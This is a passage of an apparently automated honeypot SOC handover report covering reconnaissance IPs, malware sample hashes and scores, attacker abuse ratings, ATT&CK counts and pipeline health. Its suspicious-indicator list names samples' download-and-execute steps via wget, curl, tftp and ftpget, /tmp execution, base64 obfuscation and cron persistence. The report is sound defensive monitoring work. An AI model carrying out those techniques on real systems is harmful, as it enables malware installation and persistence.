- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **4** | 2026-08-22 03:18 | 2026-08-22 04:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.50.218[.]37` | **2** | 2026-08-22 03:22 | 2026-08-22 03:24 | 2m | 0 | `T1592` | 🟢 LOW |
| `62.197.221[.]186` | **2** | 2026-08-22 03:36 | 2026-08-22 03:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-22 03:55 | 2026-08-22 03:56 | 2m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-08-22 04:46 | 2026-08-22 04:47 | 10s | 0 | `T1592` | 🟢 LOW |
| `120.136.25[.]236` | 1 | 2026-08-22 03:46 | 2026-08-22 03:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `148.204.110[.]113` | 1 | 2026-08-22 03:10 | 2026-08-22 03:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `158.174.70[.]215` | 1 | 2026-08-22 04:41 | 2026-08-22 04:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]132` | 1 | 2026-08-22 04:29 | 2026-08-22 04:29 | 4s | 0 | `T1592` | 🟢 LOW |
| `186.249.29[.]151` | 1 | 2026-08-22 04:29 | 2026-08-22 04:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-08-22 03:10 | 2026-08-22 03:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.194.67[.]30` | 1 | 2026-08-22 04:28 | 2026-08-22 04:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-08-22 03:50 | 2026-08-22 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-08-22 04:03 | 2026-08-22 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]39` | 1 | 2026-08-22 04:05 | 2026-08-22 04:05 | 4s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-08-22 04:04 | 2026-08-22 04:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `80.216.156[.]131` | 1 | 2026-08-22 04:08 | 2026-08-22 04:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.233.137[.]32` | 1 | 2026-08-22 04:19 | 2026-08-22 04:21 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `148.204.110[.]113` | MX | Instituto Politecnico Nacional | **100** ⚠️ | 7 |
| `195.222.57[.]190` | BA | Public Enterprise BH Telecom DD | **100** ⚠️ | 50 |
| `16.5.0[.]132` | BR | EMBNEX. LLC | **100** ⚠️ | 8 |
| `65.20.146[.]109` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `106.153.181[.]80` | JP | Japan Internet Xing Co., Ltd. | **100** ⚠️ | 25 |
| `211.58.176[.]42` | KR | SK Broadband Co Ltd | **100** ⚠️ | 2 |
| `80.216.156[.]131` | SE | Tele2 Sverige AB | **100** ⚠️ | 1 |
| `58.215.243[.]6` | CN | CHINANET BACKBONE | **100** ⚠️ | 50 |
| `112.26.99[.]93` | CN | China Mobile Communications Corporation | **100** ⚠️ | 45 |
| `220.246.33[.]79` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 76 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 63 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 1 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 86 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (25.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 16 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 63 priority case(s) shown individually · 18 recon entry/entries in table (4 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-22T06:45:10Z_
